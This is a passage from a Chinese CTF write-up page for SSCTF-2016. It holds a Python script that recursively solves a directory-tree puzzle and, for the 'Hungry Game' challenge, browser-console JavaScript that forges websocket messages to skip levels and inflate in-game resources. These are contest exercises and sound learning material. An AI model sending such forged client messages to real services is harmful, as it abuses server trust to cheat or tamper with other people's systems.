leaf</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"># f[x] = d[x] &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;: x is leaf</span></p></td></tr></tbody></table><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">一棵树，构造方法类似线段树。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">不难推测出文件夹0是左叶子1是右叶子d就是d那么我们的目标是求根目录的f，写个递归构造直接得到：</span></p><h3><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></h3><pre class="brush:python;toolbar:false">import&nbsp;os
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;def&nbsp;calcf(mulu):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=open(mulu+&quot;/d&quot;,&quot;r&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rr=r.read()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d=int(rr[2:],2)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ls=os.listdir(mulu)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&nbsp;&#39;0&#39;&nbsp;not&nbsp;in&nbsp;ls:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;d
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp1=calcf(mulu+&quot;/0&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp2=calcf(mulu+&quot;/1&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maxtemp=temp1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;temp2&gt;temp1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maxtemp=temp2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;d^maxtemp
&nbsp;&nbsp;&nbsp;print&nbsp;hex(int(calcf(&quot;7&quot;)))[2:-1].decode(&quot;hex&quot;)</pre><h3><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span><br/></h3><p><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这个游戏很好玩啊&nbsp; hhhh300&nbsp; Hungry Game</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">首先看js 用socket跳关</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">data = JSON.stringify([msg(&#39;next&#39;, {})]);</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">ws.send(data);</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">连跳两关之后需要采木头</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">data = JSON.stringify([msg(&#39;wood&#39;, {&#39;time&#39;: 1e10})]);</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">ws.send(data);</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">下一关是钻石。。 一次最多50个，需要写循环（完全MC即视感）</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01cc885c922c51fea0.png" title="t0177e41b15867c957f.png" alt="http://p7.qhimg.com/t0177e41b15867c957f.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">for(var&nbsp;i=0;i&lt;500;i++){
&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;JSON.stringify([msg(&#39;diamond&#39;,&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;count&#39;:&nbsp;20
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;})]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ws.send(data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">最后打BOSS&nbsp; 这个靠脸。。 我打了四次才过去。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t017f384a7e5076bbbb.png" title="t014d86bd8c9f07ea98.png" alt="http://p5.qhimg.com/t014d86bd8c9f07ea98.png"/></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/2768.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="FlappyPig SSCTF-2016 Writeup - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="2768" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
